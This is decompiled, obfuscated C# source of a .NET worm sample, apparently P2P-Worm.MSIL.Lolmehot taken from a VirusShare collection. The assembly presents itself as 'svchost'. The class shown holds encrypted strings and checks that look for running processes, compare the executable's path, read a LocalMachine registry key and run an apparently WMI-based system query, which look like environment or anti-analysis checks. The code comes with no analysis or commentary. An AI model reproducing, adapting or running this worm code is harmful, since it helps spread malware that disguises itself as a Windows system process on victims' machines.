// Decompiled with JetBrains decompiler
// Type: .
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 25545D60-5676-428B-9FFC-357483B03EE5
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\P2P-Worm.MSIL.Lolmehot.k-8a38e3e604f0bbf9f0f3730a5c4ad559da00b261a7063f21c63ddcceeae8f691.exe

using \u0001;
using \u0005;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace \u0005
{
  internal sealed class \u0003
  {
    private static object \u0001;
    private static string \u0001;
    private static string \u0002 = \u0003.\u0002(33626);
    private static RegistryKey \u0001 = \u008B\u0002.\u007E\u0098\u0003((object) Registry.LocalMachine, \u0003.\u0002(33675), false);
    private static object \u0002 = \u0002\u0003.\u001D\u0004(\u0091.\u007E\u0099\u0003((object) \u0003.\u0001, \u0003.\u0002(33736)));
    private static string \u0003 = \u0003.\u0002(33749);

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static bool \u0002()
    {
      int num1;
      int num2;
      bool flag;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        flag = Process.GetProcessesByName(\u0003.\u0002(33782)).Length >= 1;
        goto label_8;
label_2:
        num1 = -1;
        switch (num2)
        {
          case 2:
            ProjectData.EndApp();
            goto label_8;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      int num3 = flag ? 1 : 0;
      if (num1 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static bool \u0003()
    {
      bool flag;
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        flag = Operators.CompareString(Application.ExecutablePath, Application.StartupPath + \u0003.\u0002(33795), false) == 0;
        goto label_8;
label_3:
        num1 = -1;
        switch (num2)
        {
          case 2:
            ProjectData.EndApp();
            goto label_8;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_3;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      int num3 = flag ? 1 : 0;
      if (num1 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static bool \u0004()
    {
      int num1;
      bool flag;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        flag = Operators.ConditionalCompareObjectEqual(\u0003.\u0002, (object) \u0003.\u0003, false);
        goto label_8;
label_2:
        num2 = -1;
        switch (num1)
        {
          case 2:
            ProjectData.EndApp();
            goto label_8;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      int num3 = flag ? 1 : 0;
      if (num2 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static bool \u0005()
    {
      bool flag;
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        \u0003.\u0002();
        flag = Operators.CompareString(\u0003.\u0001, \u0003.\u0002(33812), false) == 0;
        goto label_8;
label_3:
        num1 = -1;
        switch (num2)
        {
          case 2:
            ProjectData.EndApp();
            goto label_8;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_3;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      int num3 = flag ? 1 : 0;
      if (num1 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static bool \u0006()
    {
      bool flag;
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        \u0003.\u0002();
        flag = Operators.CompareString(\u0003.\u0001, \u0003.\u0002(33849), false) == 0;
        goto label_8;
label_3:
        num1 = -1;
        switch (num2)
        {
          case 2:
            ProjectData.EndApp();
            goto label_8;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_3;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      int num3 = flag ? 1 : 0;
      if (num1 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static bool \u0007()
    {
      bool flag;
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        \u0003.\u0002();
        flag = Operators.CompareString(\u0003.\u0001, \u0003.\u0002(33870), false) == 0;
        goto label_8;
label_3:
        num1 = -1;
        switch (num2)
        {
          case 2:
            ProjectData.EndApp();
            goto label_8;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_3;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      int num3 = flag ? 1 : 0;
      if (num1 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private static void \u0002()
    {
      int num1;
      int num2;
      try
      {
        \u0099\u0002.\u009C();
        num2 = 2;
        \u0002\u0003 obj1 = \u0002\u0003.\u001D\u0004;
        \u0096 obj2 = \u0096.\u0096;
        object obj3 = \u0004\u0002.\u0002\u0002(\u0003.\u0002(33907), (string) null);
        string str = \u0003.\u0002(33920);
        object[] objArray1 = new object[1]
        {
          (object) \u0003.\u0002
        };
        object[] objArray2 = objArray1;
        bool[] flagArray1 = new bool[1]{ true };
        bool[] flagArray2 = flagArray1;
        object obj4 = obj2(obj3, (System.Type) null, str, objArray2, (string[]) null, (System.Type[]) null, flagArray2);
        if (flagArray1[0])
        {
          // ISSUE: type reference
          \u0003.\u0002 = (string) \u0015\u0002.\u0093(\u0002\u0003.\u001D\u0004(objArray1[0]), \u001C\u0003.\u009F\u0002(__typeref (string)));
        }
        \u0003.\u0001 = obj1(obj4);
        IEnumerator enumerator = \u009E\u0002.\u007E\u0080\u0002((object) (IEnumerable) \u0003.\u0001);
        while (\u0080.\u007E\u0083\u0002((object) enumerator))
        {
          object obj5 = \u0002\u0003.\u001D\u0004(\u0002\u0003.\u007E\u0084\u0002((object) enumerator));
          \u0003.\u0001 = \u0016\u0002.\u0092(\u0096.\u0096(obj5, (System.Type) null, \u0003.\u0002(33933), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
        }
        if (enumerator is IDisposable)
        {
          \u0099.\u007E\u0086\u0002((object) (enumerator as IDisposable));
          goto label_14;
        }
        else
          goto label_14;
label_9:
        num1 = -1;
        switch (num2)
        {
          case 2:
            \u0099\u0002.\u009D();
            goto label_14;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw \u0087\u0002.\u009A(-2146828237);
label_14:
      if (num1 == 0)
        return;
      \u0099\u0002.\u009C();
    }
  }
}
